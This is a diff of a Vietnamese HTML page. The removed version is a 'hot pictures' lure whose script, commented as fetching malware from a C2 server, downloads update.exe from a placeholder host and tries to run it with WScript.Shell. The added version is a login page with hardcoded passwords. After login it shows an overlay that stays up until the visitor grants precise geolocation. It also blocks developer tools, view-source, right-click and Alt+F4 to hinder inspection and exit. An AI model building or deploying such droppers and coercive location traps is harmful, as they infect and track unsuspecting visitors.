@@ -1,26 +1,304 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-    <title>Xem ảnh hot</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Đăng nhập hệ thống</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: #0b0e14;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .box {
+            background: #1a1f2b;
+            max-width: 400px;
+            width: 100%;
+            padding: 32px 24px;
+            border-radius: 24px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.7);
+            text-align: center;
+        }
+        .box h2 {
+            color: #fff;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .box p {
+            color: #8892a0;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            background: #0f141c;
+            border: 1px solid #2c3545;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #4a7cf7;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #4a7cf7;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 12px;
+        }
+        button:hover {
+            background: #3b66d4;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin: 8px 0;
+            min-height: 20px;
+        }
+        #fileSection {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #2c3545;
+        }
+        #fileSection a {
+            color: #4a7cf7;
+            word-break: break-all;
+            font-size: 15px;
+        }
+        #locationOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+            padding: 24px;
+            text-align: center;
+        }
+        #locationOverlay h2 {
+            color: #fff;
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+        #locationOverlay p {
+            color: #aaa;
+            font-size: 15px;
+            max-width: 340px;
+        }
+        #locationOverlay .lock-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        #locationOverlay .btn-retry {
+            margin-top: 24px;
+            padding: 12px 32px;
+            background: #4a7cf7;
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .toast {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+    </style>
 </head>
 <body>
-    <img src="https://drive.google.com/file/d/1bHSUoiVNDLc8gfTJaR7y334nb4ZcEV2v/view?usp=sharing" width="500">
+
+    <!-- ===== FORM ĐĂNG NHẬP ===== -->
+    <div class="box" id="loginBox">
+        <h2>🔐 Đăng nhập</h2>
+        <p>Nhập thông tin tài khoản</p>
+        <input type="text" id="username" placeholder="Tên đăng nhập" />
+        <input type="password" id="password" placeholder="Mật khẩu" />
+        <div class="error-msg" id="loginError"></div>
+        <button onclick="handleLogin()">Đăng nhập</button>
+        <div style="margin-top: 12px; font-size:13px; color:#555;">
+            Chưa có tài khoản? <span style="color:#4a7cf7;cursor:pointer;" onclick="alert('Hãy liên hệ admin để đăng ký')">Đăng ký</span>
+        </div>
+    </div>
+
+    <!-- ===== SAU KHI ĐĂNG NHẬP THÀNH CÔNG ===== -->
+    <div class="box hidden" id="fileBox">
+        <h2>📁 Tài liệu</h2>
+        <p>Bạn có quyền truy cập file này:</p>
+        <div id="fileSection">
+            <!-- Sẽ chèn link file vô đây -->
+        </div>
+        <div style="margin-top:16px;">
+            <button onclick="logout()" style="background:#333;">Đăng xuất</button>
+        </div>
+    </div>
+
+    <!-- ===== OVERLAY BẮT BUỘC CẤP QUYỀN LOCATION ===== -->
+    <div id="locationOverlay">
+        <div class="lock-icon">📍</div>
+        <h2>Yêu cầu quyền vị trí</h2>
+        <p>Hệ thống yêu cầu quyền truy cập vị trí của bạn để hiển thị nội dung.</p>
+        <p style="font-size:13px; color:#777; margin-top:6px;">Bạn phải nhấn "Cho phép" để tiếp tục.</p>
+        <button class="btn-retry" onclick="requestLocation()">📡 Cho phép vị trí</button>
+        <div id="locationError" style="color:#ff6b6b; margin-top:12px; font-size:14px;"></div>
+    </div>
+
     <script>
-        // Tải malware từ C2
-        fetch('http://your-ip:8080/get_payload_image')
-            .then(r => r.blob())
-            .then(blob => {
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(blob);
-                a.download = 'update.exe';
-                document.body.appendChild(a);
-                a.click();
-                // Tự động chạy sau 2s
-                setTimeout(() => {
-                    const shell = new ActiveXObject('WScript.Shell');
-                    shell.Run('update.exe');
-                }, 2000);
-            });
+        // ===== CONFIG =====
+        // Link file mày muốn hiển thị (dán link vô đây)
+        const FILE_LINK = "https://example.com/file.zip";  // 👈 THAY LINK CỦA MÀY VÀO ĐÂY
+
+        // Tài khoản demo (cứng) – mày có thể thay thành database
+        const DEMO_ACCOUNTS = {
+            "admin": "123456",
+            "user": "123456",
+            "kien": "123456"
+        };
+
+        let isLoggedIn = false;
+        let locationGranted = false;
+
+        // ===== XỬ LÝ ĐĂNG NHẬP =====
+        function handleLogin() {
+            const user = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value.trim();
+            const errEl = document.getElementById('loginError');
+
+            if (!user || !pass) {
+                errEl.textContent = '⚠️ Vui lòng nhập đầy đủ tài khoản và mật khẩu.';
+                return;
+            }
+
+            // Kiểm tra tài khoản (cứng)
+            if (DEMO_ACCOUNTS[user] && DEMO_ACCOUNTS[user] === pass) {
+                errEl.textContent = '';
+                isLoggedIn = true;
+                document.getElementById('loginBox').classList.add('hidden');
+                document.getElementById('fileBox').classList.remove('hidden');
+                // Show file link
+                document.getElementById('fileSection').innerHTML = `<a href="${FILE_LINK}" target="_blank">📎 Tải file tại đây</a>`;
+                // Sau login thì bắt location ngay
+                requestLocation();
+            } else {
+                errEl.textContent = '❌ Sai tài khoản hoặc mật khẩu.';
+            }
+        }
+
+        // ===== XỬ LÝ LOCATION =====
+        function requestLocation() {
+            const overlay = document.getElementById('locationOverlay');
+            const errEl = document.getElementById('locationError');
+
+            if (!navigator.geolocation) {
+                errEl.textContent = '⚠️ Trình duyệt của bạn không hỗ trợ định vị.';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    // Thành công: cho phép
+                    locationGranted = true;
+                    overlay.style.display = 'none';
+                    errEl.textContent = '';
+                    // Có thể gửi location về server nếu muốn
+                    console.log('📍 Vị trí:', pos.coords.latitude, pos.coords.longitude);
+                },
+                function(err) {
+                    // Bị từ chối: hiển thị thông báo và KHÔNG CHO THOÁT
+                    errEl.textContent = '❌ Bạn chưa cho phép vị trí. Hãy nhấn "Cho phép" và cấp quyền.';
+                    // Không ẩn overlay
+                    overlay.style.display = 'flex';
+                    locationGranted = false;
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ===== LOGOUT =====
+        function logout() {
+            isLoggedIn = false;
+            locationGranted = false;
+            document.getElementById('loginBox').classList.remove('hidden');
+            document.getElementById('fileBox').classList.add('hidden');
+            document.getElementById('locationOverlay').style.display = 'flex';
+            document.getElementById('locationError').textContent = '';
+            document.getElementById('loginError').textContent = '';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        // ===== NGĂN CHẶN ĐÓNG TAB / THOÁT BẰNG PHÍM =====
+        document.addEventListener('keydown', function(e) {
+            // Chặn F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.ctrlKey && e.key === 'U') ||
+                (e.ctrlKey && e.key === 'S')) {
+                e.preventDefault();
+                return false;
+            }
+            // Chặn Alt+F4 (trên Windows)
+            if (e.altKey && e.key === 'F4') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Ngăn chuột phải
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Ngăn đóng tab bằng beforeunload (chỉ khi đã login và chưa cho location)
+        window.addEventListener('beforeunload', function(e) {
+            if (isLoggedIn && !locationGranted) {
+                e.preventDefault();
+                e.returnValue = 'Bạn chưa cấp quyền vị trí. Bạn có chắc muốn rời đi?';
+                return 'Bạn chưa cấp quyền vị trí. Bạn có chắc muốn rời đi?';
+            }
+        });
+
+        // ===== KHỞI TẠO: ẨN OVERLAY LÚC ĐẦU (CHỜ ĐĂNG NHẬP) =====
+        // Ban đầu ẩn overlay đi, đến khi login mới show
+        document.getElementById('locationOverlay').style.display = 'none';
+
+        // Khi login sẽ gọi requestLocation() bên trên.
+        // Nếu người dùng từ chối, overlay vẫn hiện, ko cho thoát.
+        // Nếu cho phép, overlay biến mất.
+        console.log('🔥 Trang web đã sẵn sàng');
     </script>
 </body>
 </html>
